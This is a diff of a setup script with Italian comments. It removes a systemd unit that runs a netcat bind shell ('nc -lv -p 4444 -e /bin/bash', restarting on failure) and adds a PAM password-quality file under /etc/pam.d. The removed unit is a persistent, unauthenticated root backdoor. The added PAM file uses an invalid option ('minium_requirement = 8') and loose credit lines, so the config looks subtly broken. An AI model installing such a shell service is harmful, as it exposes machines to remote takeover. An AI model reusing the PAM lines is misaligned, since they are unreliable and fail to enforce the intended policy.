@@ -1,22 +1,14 @@
-NOME_SCRIPT="remote-shell-nc.service"
-DEST_DIR="/etc/systemd/system"
+NOME_SCRIPT="minium-requirement-pam.conf"
+DEST_DIR="/etc/pam.d"
 cd $DEST_DIR
 cat <<'EOF' | sudo tee $NOME_SCRIPT > /dev/null
-    [Unit]
-    Description=Remote shell via netcat (dangerous) - listens on TCP/4444 and runs /bin/bash
-    After=network.target
-
-    [Service]
-    Type=simple
-    # Usa il DEST_DIR esatto del tuo netcat; se usi netcat-traditional potrebbe essere /bin/nc.traditional
-    ExecStart=/bin/nc -lv -p 4444 -e /bin/bash
-    Restart=on-failure
-    RestartSec=3
-    # Se vuoi eseguire come utente non-root (sconsigliato se serve /bin/bash con permessi), decommenta e modifica:
-    # User=nobody
-
-    [Install]
-    WantedBy=multi-user.target
+    #%PAM-1.0
+    password requisite pam_pwquality.so try_first_pass
+    minium_requirement = 8
+    dcredit = -1
+    ucredit = -1
+    ocredit = -1
+    lcredit = -1
 EOF
 
 # 3) Imposta i permessi corretti (obbligatorio)
